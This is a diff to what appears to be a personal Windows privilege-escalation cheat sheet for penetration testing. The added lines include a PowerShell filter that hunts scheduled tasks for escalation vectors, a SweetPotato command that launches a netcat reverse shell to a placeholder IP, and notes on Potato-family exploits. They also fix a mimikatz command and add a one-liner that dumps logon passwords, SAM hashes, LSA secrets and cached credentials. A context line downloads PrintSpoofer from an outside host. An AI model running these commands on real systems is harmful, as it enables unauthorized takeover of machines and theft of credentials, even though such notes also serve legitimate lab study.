@@ -1120,6 +1120,14 @@ net localgroup administrators # Verify
 
 ### Scheduled Tasks
 
+Find.
+
+```bash     
+$header="HostName","TaskName","NextRunTime","Status","LogonMode","LastRunTime","LastResult","Author","TaskToRun","StartIn","Comment","ScheduledTaskState","IdleTime","PowerManagement","RunAsUser","DeleteTaskIfNotRescheduled","StopTaskIfRunsXHoursandXMins","Schedule","ScheduleType","StartTime","StartDate","EndDate","Days","Months","RepeatEvery","RepeatUntilTime","RepeatUntilDuration","RepeatStopIfStillRunning"
+
+schtasks /query /fo csv /nh /v | ConvertFrom-Csv -Header $header | select -uniq TaskName,NextRunTime,Status,TaskToRun,RunAsUser | Where-Object {$_.RunAsUser -ne $env:UserName -and $_.TaskToRun -notlike "%windir%*" -and $_.TaskToRun -ne "COM handler" -and $_.TaskToRun -notlike "%systemroot%*" -and $_.TaskToRun -notlike "C:\Windows\*" -and $_.TaskName -notlike "\Microsoft\Windows\*"}
+```
+
 For us, three pieces of information are vital to obtain from a scheduled task to identify possible privilege escalation vectors:
 
     As which user account (principal) does this task get executed?
@@ -1170,24 +1178,33 @@ iwr -uri http://192.168.119.2/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
 whoami # Verify that it worked, that you are not NT AUTHORITY\SYSTEM
 ```
 
-There are other similar tools such as RottenPotato, SweetPotato, or JuicyPotato.
+SweetPotato.
 
 ```bash
-# Juicy Potato - https://github.com/ohpe/juicy-potato
-Abuse SeImpersonate or SeAssignPrimaryToken Privileges for System Impersonation
+.\SweetPotato.exe -e EfsRpc -p c:\Users\Public\nc.exe -a "10.10.10.10 1234 -e cmd"
+```
 
-# Lovely Potato Automated Juicy Potato - https://github.com/TsukiCTF/Lovely-Potato
-Works only until Windows Server 2016 and Windows 10 until patch 1803
+There are other similar tools such as RottenPotato, SweetPotato, or JuicyPotato.
 
-# PrintSpoofer Exploit the PrinterBug for System Impersonation
-Works for Windows Server 2019 and Windows 10, Spooler Service needs to be on
 
-# RoguePotato Upgraded Juicy Potato
+Juicy Potato 
+- https://github.com/ohpe/juicy-potato
+- Abuse SeImpersonate or SeAssignPrimaryToken Privileges for System Impersonation
+
+Lovely Potato (Automated Juicy Potato)
+- https://github.com/TsukiCTF/Lovely-Potato
+- Works only until Windows Server 2016 and Windows 10 until patch 1803
+
+PrintSpoofer (Exploit the PrinterBug for System Impersonation)
+- Works for Windows Server 2019 and Windows 10, Spooler Service needs to be on
+
+RoguePotato (Upgraded Juicy Potato)
 Works for Windows Server 2019 and Windows 10
 
-# GodPotato - Best if Spooler Service isn't On
-Try both NET2 and NET4 unless you know which one to use
-```
+GodPotato
+- Best if Spooler Service isn't On, with SweetPotato coming close
+- Try both NET2 and NET4 unless you know which one to use
+
 
 #### Decrypt GPP Password
 
@@ -1217,6 +1234,8 @@ Invoke-EventViewer "C:\Windows\Tasks\shell.exe"
 
 Run all MimiKatz commands and save the output:
 
+If mimikatz is acting a fool, do a one-liner.
+
 ```bash
 .\mimikatz.exe
 token::elevate # Makes sure commands are run as system
@@ -1227,13 +1246,15 @@ sekurlsa::logonpasswords # Who has been on the host machine?
 kerberos::list /export
 kerberos::ptt ticket.kirbi # whoami will return your name pre-ptt, must test by access or executing something you couldn't before
 lsadump::lsa /inject
-sadump::lsa /inject /name:krbtgt
+lsadump::lsa /inject /name:krbtgt
 kerberos::tgt
 sekurlsa::msv
 sekurlsa::ekeys
 lsadump::sam
 lsadump::secrets
 lsadump::cache
+
+.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "kerberos::list /export" "sekurlsa::msv" "sekurlsa::ekeys" "lsadump::sam" "lsadump::secrets" "lsadump::cache"  "exit"
 ```
 
 
